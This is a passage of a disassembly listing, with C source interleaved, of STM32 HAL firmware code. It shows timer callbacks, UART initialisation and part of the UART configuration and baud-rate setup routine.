 80055ec:	68ba      	ldr	r2, [r7, #8]
 80055ee:	4313      	orrs	r3, r2
 80055f0:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 80055f2:	687b      	ldr	r3, [r7, #4]
 80055f4:	681b      	ldr	r3, [r3, #0]
 80055f6:	68ba      	ldr	r2, [r7, #8]
 80055f8:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 80055fa:	687b      	ldr	r3, [r7, #4]
 80055fc:	2201      	movs	r2, #1
 80055fe:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005602:	687b      	ldr	r3, [r7, #4]
 8005604:	2200      	movs	r2, #0
 8005606:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 800560a:	2300      	movs	r3, #0
}
 800560c:	4618      	mov	r0, r3
 800560e:	3714      	adds	r7, #20
 8005610:	46bd      	mov	sp, r7
 8005612:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005616:	4770      	bx	lr
 8005618:	40012c00 	.word	0x40012c00
 800561c:	40014000 	.word	0x40014000

08005620 <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 8005620:	b480      	push	{r7}
 8005622:	b083      	sub	sp, #12
 8005624:	af00      	add	r7, sp, #0
 8005626:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 8005628:	bf00      	nop
 800562a:	370c      	adds	r7, #12
 800562c:	46bd      	mov	sp, r7
 800562e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005632:	4770      	bx	lr

08005634 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 8005634:	b480      	push	{r7}
 8005636:	b083      	sub	sp, #12
 8005638:	af00      	add	r7, sp, #0
 800563a:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 800563c:	bf00      	nop
 800563e:	370c      	adds	r7, #12
 8005640:	46bd      	mov	sp, r7
 8005642:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005646:	4770      	bx	lr

08005648 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 8005648:	b480      	push	{r7}
 800564a:	b083      	sub	sp, #12
 800564c:	af00      	add	r7, sp, #0
 800564e:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 8005650:	bf00      	nop
 8005652:	370c      	adds	r7, #12
 8005654:	46bd      	mov	sp, r7
 8005656:	f85d 7b04 	ldr.w	r7, [sp], #4
 800565a:	4770      	bx	lr

0800565c <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 800565c:	b580      	push	{r7, lr}
 800565e:	b082      	sub	sp, #8
 8005660:	af00      	add	r7, sp, #0
 8005662:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 8005664:	687b      	ldr	r3, [r7, #4]
 8005666:	2b00      	cmp	r3, #0
 8005668:	d101      	bne.n	800566e <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 800566a:	2301      	movs	r3, #1
 800566c:	e040      	b.n	80056f0 <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 800566e:	687b      	ldr	r3, [r7, #4]
 8005670:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 8005672:	2b00      	cmp	r3, #0
 8005674:	d106      	bne.n	8005684 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 8005676:	687b      	ldr	r3, [r7, #4]
 8005678:	2200      	movs	r2, #0
 800567a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 800567e:	6878      	ldr	r0, [r7, #4]
 8005680:	f7fb fd78 	bl	8001174 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 8005684:	687b      	ldr	r3, [r7, #4]
 8005686:	2224      	movs	r2, #36	; 0x24
 8005688:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 800568a:	687b      	ldr	r3, [r7, #4]
 800568c:	681b      	ldr	r3, [r3, #0]
 800568e:	681a      	ldr	r2, [r3, #0]
 8005690:	687b      	ldr	r3, [r7, #4]
 8005692:	681b      	ldr	r3, [r3, #0]
 8005694:	f022 0201 	bic.w	r2, r2, #1
 8005698:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 800569a:	687b      	ldr	r3, [r7, #4]
 800569c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800569e:	2b00      	cmp	r3, #0
 80056a0:	d002      	beq.n	80056a8 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 80056a2:	6878      	ldr	r0, [r7, #4]
 80056a4:	f000 fa54 	bl	8005b50 <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 80056a8:	6878      	ldr	r0, [r7, #4]
 80056aa:	f000 f825 	bl	80056f8 <UART_SetConfig>
 80056ae:	4603      	mov	r3, r0
 80056b0:	2b01      	cmp	r3, #1
 80056b2:	d101      	bne.n	80056b8 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 80056b4:	2301      	movs	r3, #1
 80056b6:	e01b      	b.n	80056f0 <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 80056b8:	687b      	ldr	r3, [r7, #4]
 80056ba:	681b      	ldr	r3, [r3, #0]
 80056bc:	685a      	ldr	r2, [r3, #4]
 80056be:	687b      	ldr	r3, [r7, #4]
 80056c0:	681b      	ldr	r3, [r3, #0]
 80056c2:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 80056c6:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 80056c8:	687b      	ldr	r3, [r7, #4]
 80056ca:	681b      	ldr	r3, [r3, #0]
 80056cc:	689a      	ldr	r2, [r3, #8]
 80056ce:	687b      	ldr	r3, [r7, #4]
 80056d0:	681b      	ldr	r3, [r3, #0]
 80056d2:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 80056d6:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 80056d8:	687b      	ldr	r3, [r7, #4]
 80056da:	681b      	ldr	r3, [r3, #0]
 80056dc:	681a      	ldr	r2, [r3, #0]
 80056de:	687b      	ldr	r3, [r7, #4]
 80056e0:	681b      	ldr	r3, [r3, #0]
 80056e2:	f042 0201 	orr.w	r2, r2, #1
 80056e6:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 80056e8:	6878      	ldr	r0, [r7, #4]
 80056ea:	f000 fad3 	bl	8005c94 <UART_CheckIdleState>
 80056ee:	4603      	mov	r3, r0
}
 80056f0:	4618      	mov	r0, r3
 80056f2:	3708      	adds	r7, #8
 80056f4:	46bd      	mov	sp, r7
 80056f6:	bd80      	pop	{r7, pc}

080056f8 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 80056f8:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 80056fc:	b08a      	sub	sp, #40	; 0x28
 80056fe:	af00      	add	r7, sp, #0
 8005700:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 8005702:	2300      	movs	r3, #0
 8005704:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 8005708:	68fb      	ldr	r3, [r7, #12]
 800570a:	689a      	ldr	r2, [r3, #8]
 800570c:	68fb      	ldr	r3, [r7, #12]
 800570e:	691b      	ldr	r3, [r3, #16]
 8005710:	431a      	orrs	r2, r3
 8005712:	68fb      	ldr	r3, [r7, #12]
 8005714:	695b      	ldr	r3, [r3, #20]
 8005716:	431a      	orrs	r2, r3
 8005718:	68fb      	ldr	r3, [r7, #12]
 800571a:	69db      	ldr	r3, [r3, #28]
 800571c:	4313      	orrs	r3, r2
 800571e:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 8005720:	68fb      	ldr	r3, [r7, #12]
 8005722:	681b      	ldr	r3, [r3, #0]
 8005724:	681a      	ldr	r2, [r3, #0]
 8005726:	4bb4      	ldr	r3, [pc, #720]	; (80059f8 <UART_SetConfig+0x300>)
 8005728:	4013      	ands	r3, r2
 800572a:	68fa      	ldr	r2, [r7, #12]
 800572c:	6812      	ldr	r2, [r2, #0]
 800572e:	6a79      	ldr	r1, [r7, #36]	; 0x24
 8005730:	430b      	orrs	r3, r1
 8005732:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 8005734:	68fb      	ldr	r3, [r7, #12]
 8005736:	681b      	ldr	r3, [r3, #0]
 8005738:	685b      	ldr	r3, [r3, #4]
 800573a:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 800573e:	68fb      	ldr	r3, [r7, #12]
 8005740:	68da      	ldr	r2, [r3, #12]
 8005742:	68fb      	ldr	r3, [r7, #12]
 8005744:	681b      	ldr	r3, [r3, #0]
 8005746:	430a      	orrs	r2, r1
 8005748:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 800574a:	68fb      	ldr	r3, [r7, #12]
 800574c:	699b      	ldr	r3, [r3, #24]
 800574e:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 8005750:	68fb      	ldr	r3, [r7, #12]
 8005752:	681b      	ldr	r3, [r3, #0]
 8005754:	4aa9      	ldr	r2, [pc, #676]	; (80059fc <UART_SetConfig+0x304>)
 8005756:	4293      	cmp	r3, r2
 8005758:	d004      	beq.n	8005764 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 800575a:	68fb      	ldr	r3, [r7, #12]
 800575c:	6a1b      	ldr	r3, [r3, #32]
 800575e:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005760:	4313      	orrs	r3, r2
 8005762:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 8005764:	68fb      	ldr	r3, [r7, #12]
 8005766:	681b      	ldr	r3, [r3, #0]
 8005768:	689b      	ldr	r3, [r3, #8]
 800576a:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 800576e:	68fb      	ldr	r3, [r7, #12]
 8005770:	681b      	ldr	r3, [r3, #0]
 8005772:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005774:	430a      	orrs	r2, r1
 8005776:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 8005778:	68fb      	ldr	r3, [r7, #12]
 800577a:	681b      	ldr	r3, [r3, #0]
 800577c:	4aa0      	ldr	r2, [pc, #640]	; (8005a00 <UART_SetConfig+0x308>)
 800577e:	4293      	cmp	r3, r2
 8005780:	d126      	bne.n	80057d0 <UART_SetConfig+0xd8>
 8005782:	4ba0      	ldr	r3, [pc, #640]	; (8005a04 <UART_SetConfig+0x30c>)
 8005784:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005788:	f003 0303 	and.w	r3, r3, #3
 800578c:	2b03      	cmp	r3, #3
 800578e:	d81b      	bhi.n	80057c8 <UART_SetConfig+0xd0>
 8005790:	a201      	add	r2, pc, #4	; (adr r2, 8005798 <UART_SetConfig+0xa0>)
 8005792:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005796:	bf00      	nop
 8005798:	080057a9 	.word	0x080057a9
 800579c:	080057b9 	.word	0x080057b9
 80057a0:	080057b1 	.word	0x080057b1
 80057a4:	080057c1 	.word	0x080057c1
 80057a8:	2301      	movs	r3, #1
 80057aa:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057ae:	e080      	b.n	80058b2 <UART_SetConfig+0x1ba>
 80057b0:	2302      	movs	r3, #2
 80057b2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057b6:	e07c      	b.n	80058b2 <UART_SetConfig+0x1ba>
 80057b8:	2304      	movs	r3, #4
 80057ba:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057be:	e078      	b.n	80058b2 <UART_SetConfig+0x1ba>
 80057c0:	2308      	movs	r3, #8
 80057c2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057c6:	e074      	b.n	80058b2 <UART_SetConfig+0x1ba>
 80057c8:	2310      	movs	r3, #16
 80057ca:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057ce:	e070      	b.n	80058b2 <UART_SetConfig+0x1ba>
 80057d0:	68fb      	ldr	r3, [r7, #12]
 80057d2:	681b      	ldr	r3, [r3, #0]
 80057d4:	4a8c      	ldr	r2, [pc, #560]	; (8005a08 <UART_SetConfig+0x310>)
 80057d6:	4293      	cmp	r3, r2
 80057d8:	d138      	bne.n	800584c <UART_SetConfig+0x154>
 80057da:	4b8a      	ldr	r3, [pc, #552]	; (8005a04 <UART_SetConfig+0x30c>)
 80057dc:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80057e0:	f003 030c 	and.w	r3, r3, #12
 80057e4:	2b0c      	cmp	r3, #12
 80057e6:	d82d      	bhi.n	8005844 <UART_SetConfig+0x14c>
 80057e8:	a201      	add	r2, pc, #4	; (adr r2, 80057f0 <UART_SetConfig+0xf8>)
 80057ea:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80057ee:	bf00      	nop
 80057f0:	08005825 	.word	0x08005825
 80057f4:	08005845 	.word	0x08005845
 80057f8:	08005845 	.word	0x08005845
 80057fc:	08005845 	.word	0x08005845
 8005800:	08005835 	.word	0x08005835
 8005804:	08005845 	.word	0x08005845
 8005808:	08005845 	.word	0x08005845
 800580c:	08005845 	.word	0x08005845
 8005810:	0800582d 	.word	0x0800582d
 8005814:	08005845 	.word	0x08005845
 8005818:	08005845 	.word	0x08005845
 800581c:	08005845 	.word	0x08005845
 8005820:	0800583d 	.word	0x0800583d
 8005824:	2300      	movs	r3, #0
 8005826:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800582a:	e042      	b.n	80058b2 <UART_SetConfig+0x1ba>
 800582c:	2302      	movs	r3, #2
 800582e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005832:	e03e      	b.n	80058b2 <UART_SetConfig+0x1ba>
 8005834:	2304      	movs	r3, #4
 8005836:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800583a:	e03a      	b.n	80058b2 <UART_SetConfig+0x1ba>
 800583c:	2308      	movs	r3, #8
 800583e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005842:	e036      	b.n	80058b2 <UART_SetConfig+0x1ba>
 8005844:	2310      	movs	r3, #16
 8005846:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800584a:	e032      	b.n	80058b2 <UART_SetConfig+0x1ba>
 800584c:	68fb      	ldr	r3, [r7, #12]
 800584e:	681b      	ldr	r3, [r3, #0]
 8005850:	4a6a      	ldr	r2, [pc, #424]	; (80059fc <UART_SetConfig+0x304>)
 8005852:	4293      	cmp	r3, r2
 8005854:	d12a      	bne.n	80058ac <UART_SetConfig+0x1b4>
 8005856:	4b6b      	ldr	r3, [pc, #428]	; (8005a04 <UART_SetConfig+0x30c>)
 8005858:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800585c:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 8005860:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005864:	d01a      	beq.n	800589c <UART_SetConfig+0x1a4>
 8005866:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 800586a:	d81b      	bhi.n	80058a4 <UART_SetConfig+0x1ac>
 800586c:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005870:	d00c      	beq.n	800588c <UART_SetConfig+0x194>
 8005872:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005876:	d815      	bhi.n	80058a4 <UART_SetConfig+0x1ac>
 8005878:	2b00      	cmp	r3, #0
 800587a:	d003      	beq.n	8005884 <UART_SetConfig+0x18c>
 800587c:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8005880:	d008      	beq.n	8005894 <UART_SetConfig+0x19c>
 8005882:	e00f      	b.n	80058a4 <UART_SetConfig+0x1ac>
 8005884:	2300      	movs	r3, #0
 8005886:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800588a:	e012      	b.n	80058b2 <UART_SetConfig+0x1ba>
 800588c:	2302      	movs	r3, #2
 800588e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005892:	e00e      	b.n	80058b2 <UART_SetConfig+0x1ba>
 8005894:	2304      	movs	r3, #4
 8005896:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800589a:	e00a      	b.n	80058b2 <UART_SetConfig+0x1ba>
 800589c:	2308      	movs	r3, #8
 800589e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058a2:	e006      	b.n	80058b2 <UART_SetConfig+0x1ba>
 80058a4:	2310      	movs	r3, #16
 80058a6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058aa:	e002      	b.n	80058b2 <UART_SetConfig+0x1ba>
 80058ac:	2310      	movs	r3, #16
 80058ae:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 80058b2:	68fb      	ldr	r3, [r7, #12]
 80058b4:	681b      	ldr	r3, [r3, #0]
 80058b6:	4a51      	ldr	r2, [pc, #324]	; (80059fc <UART_SetConfig+0x304>)
 80058b8:	4293      	cmp	r3, r2
 80058ba:	d17a      	bne.n	80059b2 <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 80058bc:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80058c0:	2b08      	cmp	r3, #8
 80058c2:	d824      	bhi.n	800590e <UART_SetConfig+0x216>
 80058c4:	a201      	add	r2, pc, #4	; (adr r2, 80058cc <UART_SetConfig+0x1d4>)
 80058c6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80058ca:	bf00      	nop
 80058cc:	080058f1 	.word	0x080058f1
 80058d0:	0800590f 	.word	0x0800590f
 80058d4:	080058f9 	.word	0x080058f9
 80058d8:	0800590f 	.word	0x0800590f
 80058dc:	080058ff 	.word	0x080058ff
 80058e0:	0800590f 	.word	0x0800590f
 80058e4:	0800590f 	.word	0x0800590f
 80058e8:	0800590f 	.word	0x0800590f
 80058ec:	08005907 	.word	0x08005907
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 80058f0:	f7fe fe6c 	bl	80045cc <HAL_RCC_GetPCLK1Freq>
 80058f4:	61f8      	str	r0, [r7, #28]
        break;
 80058f6:	e010      	b.n	800591a <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 80058f8:	4b44      	ldr	r3, [pc, #272]	; (8005a0c <UART_SetConfig+0x314>)
 80058fa:	61fb      	str	r3, [r7, #28]
        break;
 80058fc:	e00d      	b.n	800591a <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 80058fe:	f7fe fdcd 	bl	800449c <HAL_RCC_GetSysClockFreq>
 8005902:	61f8      	str	r0, [r7, #28]
        break;
 8005904:	e009      	b.n	800591a <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005906:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800590a:	61fb      	str	r3, [r7, #28]
        break;
 800590c:	e005      	b.n	800591a <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 800590e:	2300      	movs	r3, #0
 8005910:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005912:	2301      	movs	r3, #1
 8005914:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005918:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 800591a:	69fb      	ldr	r3, [r7, #28]
 800591c:	2b00      	cmp	r3, #0
 800591e:	f000 8107 	beq.w	8005b30 <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005922:	68fb      	ldr	r3, [r7, #12]
 8005924:	685a      	ldr	r2, [r3, #4]
 8005926:	4613      	mov	r3, r2
 8005928:	005b      	lsls	r3, r3, #1
 800592a:	4413      	add	r3, r2
 800592c:	69fa      	ldr	r2, [r7, #28]
 800592e:	429a      	cmp	r2, r3
 8005930:	d305      	bcc.n	800593e <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 8005932:	68fb      	ldr	r3, [r7, #12]
 8005934:	685b      	ldr	r3, [r3, #4]
 8005936:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005938:	69fa      	ldr	r2, [r7, #28]
 800593a:	429a      	cmp	r2, r3
 800593c:	d903      	bls.n	8005946 <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 800593e:	2301      	movs	r3, #1
 8005940:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005944:	e0f4      	b.n	8005b30 <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 8005946:	69fb      	ldr	r3, [r7, #28]
 8005948:	2200      	movs	r2, #0
 800594a:	461c      	mov	r4, r3
 800594c:	4615      	mov	r5, r2
 800594e:	f04f 0200 	mov.w	r2, #0
 8005952:	f04f 0300 	mov.w	r3, #0
 8005956:	022b      	lsls	r3, r5, #8
 8005958:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 800595c:	0222      	lsls	r2, r4, #8
 800595e:	68f9      	ldr	r1, [r7, #12]
 8005960:	6849      	ldr	r1, [r1, #4]
 8005962:	0849      	lsrs	r1, r1, #1
 8005964:	2000      	movs	r0, #0
 8005966:	4688      	mov	r8, r1
 8005968:	4681      	mov	r9, r0
 800596a:	eb12 0a08 	adds.w	sl, r2, r8
 800596e:	eb43 0b09 	adc.w	fp, r3, r9
 8005972:	68fb      	ldr	r3, [r7, #12]
 8005974:	685b      	ldr	r3, [r3, #4]
 8005976:	2200      	movs	r2, #0
 8005978:	603b      	str	r3, [r7, #0]
 800597a:	607a      	str	r2, [r7, #4]
 800597c:	e9d7 2300 	ldrd	r2, r3, [r7]
 8005980:	4650      	mov	r0, sl
 8005982:	4659      	mov	r1, fp
 8005984:	f7fa fc2a 	bl	80001dc <__aeabi_uldivmod>
 8005988:	4602      	mov	r2, r0
 800598a:	460b      	mov	r3, r1
 800598c:	4613      	mov	r3, r2
 800598e:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 8005990:	69bb      	ldr	r3, [r7, #24]
 8005992:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 8005996:	d308      	bcc.n	80059aa <UART_SetConfig+0x2b2>
 8005998:	69bb      	ldr	r3, [r7, #24]
 800599a:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 800599e:	d204      	bcs.n	80059aa <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 80059a0:	68fb      	ldr	r3, [r7, #12]
 80059a2:	681b      	ldr	r3, [r3, #0]
 80059a4:	69ba      	ldr	r2, [r7, #24]
 80059a6:	60da      	str	r2, [r3, #12]
 80059a8:	e0c2      	b.n	8005b30 <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 80059aa:	2301      	movs	r3, #1
 80059ac:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80059b0:	e0be      	b.n	8005b30 <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 80059b2:	68fb      	ldr	r3, [r7, #12]
 80059b4:	69db      	ldr	r3, [r3, #28]
 80059b6:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 80059ba:	d16a      	bne.n	8005a92 <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 80059bc:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80059c0:	2b08      	cmp	r3, #8
 80059c2:	d834      	bhi.n	8005a2e <UART_SetConfig+0x336>
 80059c4:	a201      	add	r2, pc, #4	; (adr r2, 80059cc <UART_SetConfig+0x2d4>)
 80059c6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80059ca:	bf00      	nop
 80059cc:	080059f1 	.word	0x080059f1
 80059d0:	08005a11 	.word	0x08005a11
 80059d4:	08005a19 	.word	0x08005a19
 80059d8:	08005a2f 	.word	0x08005a2f
 80059dc:	08005a1f 	.word	0x08005a1f
 80059e0:	08005a2f 	.word	0x08005a2f
 80059e4:	08005a2f 	.word	0x08005a2f
 80059e8:	08005a2f 	.word	0x08005a2f
 80059ec:	08005a27 	.word	0x08005a27
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 80059f0:	f7fe fdec 	bl	80045cc <HAL_RCC_GetPCLK1Freq>
 80059f4:	61f8      	str	r0, [r7, #28]
        break;
 80059f6:	e020      	b.n	8005a3a <UART_SetConfig+0x342>
 80059f8:	efff69f3 	.word	0xefff69f3
 80059fc:	40008000 	.word	0x40008000
 8005a00:	40013800 	.word	0x40013800
 8005a04:	40021000 	.word	0x40021000
 8005a08:	40004400 	.word	0x40004400
 8005a0c:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005a10:	f7fe fdf2 	bl	80045f8 <HAL_RCC_GetPCLK2Freq>
 8005a14:	61f8      	str	r0, [r7, #28]
        break;
 8005a16:	e010      	b.n	8005a3a <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
